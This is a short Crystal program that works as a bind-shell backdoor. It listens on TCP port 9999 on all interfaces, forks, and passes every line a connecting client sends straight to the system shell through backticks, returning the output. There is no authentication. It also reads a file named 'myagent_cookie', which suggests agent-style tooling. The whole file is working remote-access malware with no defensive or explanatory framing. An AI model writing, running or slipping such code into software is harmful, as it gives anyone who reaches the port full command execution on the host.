require "socket"
stdout = IO::Memory.new
connfd = TCPServer.new("0.0.0.0", 9999)
def cook
     content = File.open("myagent_cookie") do |file|
          file.gets_to_end
     end
     return content
end
def handle_master(master) : Nil
    loop do
        message = `#{master.gets.to_s}`
        master.puts(message)
    end
    rescue e
        puts "master disconnected"
end
proc = Process.fork do
    while master = connfd.accept?
        spawn handle_master(master)
    end
end
